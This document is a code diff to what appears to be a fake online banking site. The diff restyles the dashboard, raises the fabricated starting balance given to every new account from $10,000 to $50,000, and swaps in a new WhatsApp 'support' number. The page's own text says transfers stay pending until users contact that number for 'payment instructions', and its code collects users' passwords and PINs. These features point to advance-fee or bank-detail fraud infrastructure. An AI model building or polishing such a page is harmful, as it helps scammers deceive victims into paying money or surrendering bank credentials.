@@ -463,14 +463,15 @@
         }
 
         .dashboard-header {
-            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
             color: white;
             padding: 3rem;
-            border-radius: 15px;
+            border-radius: 20px;
             margin-bottom: 2.5rem;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 15px 35px rgba(26, 35, 126, 0.2);
             position: relative;
             overflow: hidden;
+            border-bottom: 4px solid #ffd700;
         }
 
         .dashboard-header::before {
@@ -502,18 +503,67 @@
 
         .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 2.5rem;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
             margin-bottom: 2.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+            .dashboard-header {
+                padding: 2rem;
+            }
+            .balance-amount {
+                font-size: 2.4rem;
+            }
+            .hero {
+                flex-direction: column;
+                padding: 3rem 1.5rem;
+                text-align: center;
+                gap: 2rem;
+            }
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            .hero-buttons {
+                justify-content: center;
+            }
+            .placeholder-image {
+                width: 280px;
+                height: 280px;
+                margin: 0 auto;
+            }
+            nav {
+                padding: 1rem;
+                justify-content: center;
+            }
+            nav ul {
+                display: none;
+            }
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            .modal-content {
+                padding: 1.5rem;
+                margin: 10% auto;
+            }
+            .chat-widget {
+                width: 90%;
+                right: 5%;
+                bottom: 80px;
+                height: 400px;
+            }
         }
 
         .dashboard-card {
             background: white;
             padding: 2.5rem;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(0, 212, 255, 0.1);
-            transition: all 0.3s;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border: 1px solid #edf2f7;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .dashboard-card:hover {
@@ -530,10 +580,11 @@
         }
 
         .balance-amount {
-            font-size: 2.8rem;
-            color: #00d4ff;
-            font-weight: bold;
+            font-size: 3.2rem;
+            color: #1a237e;
+            font-weight: 800;
             margin-bottom: 0.8rem;
+            letter-spacing: -1px;
         }
 
         .balance-label {
@@ -576,19 +627,19 @@
 
         .btn-action {
             width: 100%;
-            padding: 1rem;
-            background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
+            padding: 1.2rem;
+            background: #1a237e;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 1rem;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 1rem;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
+            letter-spacing: 1px;
+            box-shadow: 0 8px 20px rgba(26, 35, 126, 0.2);
         }
 
         .btn-action:hover {
@@ -1338,7 +1389,7 @@
         <div style="background: white; padding: 2.5rem; border-radius: 15px;">
             <div style="margin-bottom: 2rem;">
                 <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">What is the minimum account balance?</h3>
-                <p style="color: #666;">You can open an account with a minimum balance of $10,000. This ensures we can provide premium services and support.</p>
+                <p style="color: #666;">You can open an account with a minimum balance of $50,000. This ensures we can provide premium services and support.</p>
             </div>
             <div style="margin-bottom: 2rem;">
                 <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">How do I link my bank account?</h3>
@@ -1435,7 +1486,7 @@
             <h3>⏳ Transfer Pending</h3>
             <p>Your transfer request is being processed. Payment instructions have been sent to your email and chat.</p>
             <div class="support-contact">
-                <strong>Support Contact:</strong> Use the chat widget or WhatsApp: 09012051900
+                <strong>Support Contact:</strong> Use the chat widget or WhatsApp: +1 (270) 576-4732
             </div>
         </div>
 
@@ -1443,28 +1494,29 @@
             <!-- Account Balance Card -->
             <div class="dashboard-card">
                 <h3>💰 Account Balance</h3>
-                <div class="balance-amount" id="accountBalance">$10,000.00</div>
-                <div class="balance-label">Available for transfer</div>
-                <div class="auto-increase-info">
-                    ✅ Your account is active and ready for transfers
+                <div class="balance-label">Current Balance</div>
+                <div class="balance-amount" id="accountBalance">$50,000.00</div>
+                <div class="balance-label">Available Funds: <span id="availableFunds">$50,000.00</span></div>
+                <div class="auto-increase-info" style="background: #e8f5e9; border-color: #2e7d32; color: #1b5e20;">
+                    🛡️ Secure Banking: Your account is protected by 256-bit encryption.
                 </div>
             </div>
 
             <div class="dashboard-card">
-                <h3>🏦 Linked Bank Account</h3>
+                <h3>🏦 Linked Accounts</h3>
                 <div id="linkedBankDisplay" style="color: #666; font-size: 0.95rem;">
-                    <p>No bank account linked yet.</p>
-                    <button class="btn-action" onclick="showBankLinkingModal()" style="margin-top: 1rem;">Link Bank Account</button>
+                    <p>Securely connect your external bank accounts for seamless transfers.</p>
+                    <button class="btn-action" onclick="showBankLinkingModal()" style="background: #283593;">Link New Account</button>
                 </div>
-                <div id="linkedBankInfo" class="linked-bank-info hidden">
-                    <h4>✅ Bank Account Linked</h4>
-                    <p><strong>Bank:</strong> <span id="linkedBankName">-</span></p>
-                    <p><strong>Account Type:</strong> <span id="linkedAccountType">-</span></p>
-                    <div class="bank-balance-display">
-                        <strong>Bank Balance:</strong>
-                        <span id="linkedBankBalance">$0.00</span>
+                <div id="linkedBankInfo" class="linked-bank-info hidden" style="background: #f1f3f9; border: 1px solid #d1d9e6; color: #2c3e50;">
+                    <h4 style="color: #1a237e;">External Account Connected</h4>
+                    <p><strong>Institution:</strong> <span id="linkedBankName">-</span></p>
+                    <p><strong>Type:</strong> <span id="linkedAccountType">-</span></p>
+                    <div class="bank-balance-display" style="background: white; border: 1px solid #e0e6ed;">
+                        <strong style="color: #5c6bc0;">Verified Balance:</strong>
+                        <span id="linkedBankBalance" style="font-size: 1.2rem; font-weight: 700; color: #1a237e;">$0.00</span>
                     </div>
-                    <button class="btn-action" onclick="showBankLinkingModal()" style="margin-top: 1rem; background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%); box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);">Change Bank</button>
+                    <button class="btn-action" onclick="showBankLinkingModal()" style="margin-top: 1rem; background: #5c6bc0;">Manage Link</button>
                 </div>
             </div>
 
@@ -1629,7 +1681,7 @@
             <div class="support-contact-info">
                 <h4>📞 Support Required</h4>
                 <p>Once you submit your transfer request, please contact our support team to complete the process.</p>
-                <p><strong>WhatsApp:</strong> 09012051900 | <strong>Chat:</strong> Use the chat widget</p>
+                <p><strong>WhatsApp:</strong> +1 (270) 576-4732 | <strong>Chat:</strong> Use the chat widget</p>
             </div>
 
             <div class="transfer-form" id="transferForm">
@@ -1913,7 +1965,7 @@
                 email,
                 password,
                 pin,
-                balance: 10000,
+                balance: 50000,
                 transferPending: false,
                 linkedBank: null,
                 createdDate: new Date().toLocaleDateString()
@@ -1951,6 +2003,9 @@
 
             greeting.textContent = `Good ${timeOfDay}, ${currentUser.name}`;
             accountBalance.textContent = formatCurrency(currentUser.balance);
+            if(document.getElementById('availableFunds')) {
+                document.getElementById('availableFunds').textContent = formatCurrency(currentUser.balance);
+            }
             memberSince.textContent = currentUser.createdDate;
 
             if (currentUser.linkedBank) {
@@ -2330,7 +2385,7 @@ Payment details will be sent to your email shortly.`;
                 addUserMessage(message);
                 input.value = '';
                 setTimeout(() => {
-                    addBotMessage('Thank you for your message. Our support team will respond shortly. For urgent matters, please contact us on WhatsApp: 09012051900');
+                    addBotMessage('Thank you for your message. Our support team will respond shortly. For urgent matters, please contact us on WhatsApp: +1 (270) 576-4732');
                 }, 500);
             }
         }
